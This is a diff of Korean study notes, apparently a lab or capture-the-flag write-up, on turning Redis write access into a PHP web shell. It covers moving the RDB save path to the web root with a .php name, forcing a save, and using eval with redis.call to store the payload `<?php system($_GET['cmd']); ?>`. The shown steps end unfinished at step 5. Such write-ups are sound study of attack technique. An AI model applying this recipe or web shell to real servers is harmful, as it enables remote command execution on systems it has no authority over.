@@ -41,4 +41,10 @@ if(isset($_POST['cmd'])){
 	- 현재 저장 경로 `/var/www/html`
 2. SET 요청을 통해 저장 위치를 변경한다.
 	- RDB를 `php`확장자로 설정해 저장하면 해당 파일에 저장된 내용이 실행 가능하기 때문에 php 확장자를 붙여 RDB를 설정한다.
-	- 
+	![[Pasted image 20260713161825.png]]
+3. RDB를 설정해도 이는 스냅샷 형태로 실제 저장된게 아니기 때문에 `save '초' '변경 키 수'` 조건에 맞춰 `save 1 1`을 넣어 저장한다.
+	![[Pasted image 20260713162212.png]]
+4. command 페이지는 eval 메서드를 사용하기 때문에 lua 스크립트에서 Redis DB와 상호 작용하기 위해 호출하는 함수 redis.call을 사용해 php 쉘 문자열을 입력해 저장한다.
+	`return redis.call("set", "tmp", "<?php system($_GET['cmd']); ?>");`
+	![[Pasted image 20260713162927.png]]
+5. 
